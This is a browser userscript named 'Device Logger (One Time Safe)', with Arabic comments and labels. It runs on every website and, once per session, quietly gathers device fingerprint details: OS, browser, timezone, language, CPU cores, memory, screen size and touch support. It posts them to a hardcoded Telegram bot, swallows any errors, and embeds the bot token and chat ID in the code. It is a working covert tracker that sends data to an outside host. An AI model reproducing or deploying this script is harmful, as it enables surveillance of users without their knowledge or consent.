// ==UserScript==
// @name         Device Logger (One Time Safe)
// @namespace    secure
// @version      1.7
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function () {
  'use strict';

  // 🛑 لا تعمل داخل iframe
  if (window.top !== window.self) return;

  const BOT_TOKEN = "8072723239:AAF6lKO3oj2pz5FkJiPu-iNBCZTCUHvruh0";
  const CHAT_ID  = "7377759751";
  const SESSION_KEY = "__device_logged__";

  // 🛑 لا تعيد الإرسال في نفس الدخول
  if (sessionStorage.getItem(SESSION_KEY)) return;

  function send(msg) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
    }).catch(()=>{});
  }

  function getBrowser() {
    const ua = navigator.userAgent;
    const m = ua.match(/(Chrome|Firefox|Safari|Edge)\/([\d.]+)/);
    return m ? `${m[1]} ${m[2]}` : "غير معروف";
  }

  function getOS() {
    const ua = navigator.userAgent;
    if (/Android/i.test(ua)) return "Android";
    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if (/Windows/i.test(ua)) return "Windows";
    if (/Mac OS/i.test(ua)) return "macOS";
    if (/Linux/i.test(ua)) return "Linux";
    return "غير معروف";
  }

  function deviceType() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "هاتف" : "كمبيوتر";
  }

  function touchSupport() {
    return ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "نعم" : "لا";
  }

  const message =
`📥 تسجيل دخول جديد

📱 نوع الجهاز: ${deviceType()}
🧠 نظام التشغيل: ${getOS()}
🌐 المتصفح: ${getBrowser()}
🕒 المنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
🗣️ اللغة: ${navigator.language}
🧮 عدد الأنوية: ${navigator.hardwareConcurrency || "غير معروف"}
💾 الذاكرة التقريبية: ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير متاح"}
📐 دقة الشاشة: ${screen.width} × ${screen.height}
👆 يدعم اللمس: ${touchSupport()}`;

  send(message);
  sessionStorage.setItem(SESSION_KEY, "1");

})();
